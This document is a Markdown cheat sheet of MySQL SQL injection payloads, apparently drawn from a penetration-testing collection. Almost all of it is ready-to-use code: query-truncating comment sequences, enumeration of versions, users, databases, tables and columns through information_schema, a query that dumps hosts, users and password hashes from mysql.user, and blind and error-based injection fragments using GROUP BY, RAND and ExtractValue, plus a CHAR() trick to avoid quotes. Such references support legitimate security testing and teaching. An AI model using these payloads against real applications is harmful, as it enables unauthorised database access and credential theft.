# SQL Injection Cheat Sheet MySQL 

Inspired by
[SQL-Injection-Cheat-Sheet-MySQL](https://blog.safebuff.com/2016/04/11/SQL-Injection-Cheat-Sheet-MySQL/) and 
[SecurityIdiots](http://www.securityidiots.com/Web-Pentest/SQL-Injection/)

- [SQL Injection Cheat Sheet MySQL](#SQL-Injection-Cheat-Sheet-MySQL)
    - [Comments](#Comments)
    - [Version](#Version)
    - [User details](#User-details)
    - [Database details](#Database-details)
    - [Database credentials](#Database-credentials)
    - [Server details](#Server-details)
    - [Table Name](#Table-Name)
    - [Find Tables From Column Name](#Find-Tables-From-Column-Name)
    - [Columns Names](#Columns-Names)
    - [Bitwise AND](#Bitwise-AND)
    - [No Quotes](#No-Quotes)
    
    
    
## SQL Injection Cheat Sheet MySQL

### Comments

```
--	 #	MySQL Linux Style            
--+      #	MySQL Windows Style          
#	 #	Hash (URL encode while use)  
--+-	 #	SQL Comment                  
;%00	 #	Null Byte                    
`        #      Backtick   
/*
```

### Version

```
SELECT VERSION();
SELECT @@VERSION;
SELECT @@GLOBAL.VERSION;
```

### User details

```
SELECT user()
SELECT current_user()
SELECT current_user
SELECT system_user()
SELECT session_user()
SELECT user,password FROM mysql.user;   # list Users
```

### Database details

```
SELECT db_name();
SELECT database();
SELECT schema_name FROM information_schema.schemata;
```

### Database credentials

```
SELECT host, user, password FROM mysql.user;
```

### Server details

```
SELECT @@hostname;
```

### Table Name

```
SELECT table_name FROM information_schema.tables;
SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema';
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; #all tables
AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'; #Blind
and 0<(select count(*) from xxx) and 1<2    #盲注爆表

AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2)))
(@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0);
AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));-- Available in 5.1.5
```

### Find Tables From Column Name

```
SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = 'columnname';#find table which have a column called 'columnname'
and 0<(select count(xxx) from tbl_user) and 1<2 ＃盲注爆字段
```

### Columns Names

```
SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename';
SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema';
```

### Bitwise AND

```
SELECT 6 & 2; # returns 2
SELECT 6 & 1; # returns 0
```

### No Quotes 

```
CONCAT(CHAR(97), CHAR(98), CHAR(99))
```
